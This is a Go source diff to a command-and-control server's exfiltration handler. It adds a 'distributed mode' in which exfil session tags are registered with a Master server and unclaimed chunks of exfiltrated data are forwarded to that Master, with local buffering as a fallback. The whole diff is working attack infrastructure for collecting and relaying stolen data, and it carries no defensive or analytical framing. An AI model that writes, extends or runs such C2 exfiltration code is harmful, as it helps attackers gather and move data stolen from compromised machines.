@@ -747,6 +747,16 @@ func (c2 *C2Manager) handleExfilMetadataFrame(frame *ExfilFrame, clientIP string
 	}
 	c2.mutex.Unlock()
 
+	// Register tag with Master for distributed exfil
+	if masterClient != nil {
+		sessionIDStr := fmt.Sprintf("%08x", meta.SessionID)
+		go func(tag, sid string) {
+			if err := masterClient.RegisterExfilTag(tag, sid); err != nil && c2.debug {
+				logf("[Exfil] Failed to register tag %s with Master: %v", tag, err)
+			}
+		}(frame.SessionTag, sessionIDStr)
+	}
+
 	ack, err := c2.handleExfilChunk(frame.Payload, meta, clientIP, assembled)
 	if err == nil {
 		c2.flushPendingLabelChunks(frame.SessionTag)
@@ -757,6 +767,25 @@ func (c2 *C2Manager) handleExfilMetadataFrame(frame *ExfilFrame, clientIP string
 func (c2 *C2Manager) handleExfilDataFrame(frame *ExfilFrame, clientIP string) (bool, error) {
 	tracker, ok := c2.getExfilTagTracker(frame.SessionTag)
 	if !ok || tracker.SessionID == 0 {
+		// Try to submit by tag if we don't know the session (distributed mode)
+		if masterClient != nil {
+			completed, err := masterClient.SubmitExfilChunkByTag(frame.SessionTag, int(frame.Counter), frame.Payload)
+			if err == nil {
+				if c2.debug {
+					logf("[Exfil] Forwarded orphan chunk tag=%s idx=%d to Master", frame.SessionTag, frame.Counter)
+				}
+				// If completed, we don't really need to do anything locally since we don't have the session
+				if completed && c2.debug {
+					logf("[Exfil] Master signaled session for tag %s is complete", frame.SessionTag)
+				}
+				return true, nil
+			}
+
+			if c2.debug {
+				logf("[Exfil] Failed to forward orphan chunk tag=%s: %v - buffering", frame.SessionTag, err)
+			}
+		}
+
 		c2.enqueuePendingLabelChunk(frame, clientIP)
 		if c2.debug {
 			logf("[Exfil] buffered frame tag=%s idx=%d awaiting metadata", frame.SessionTag, frame.Counter)
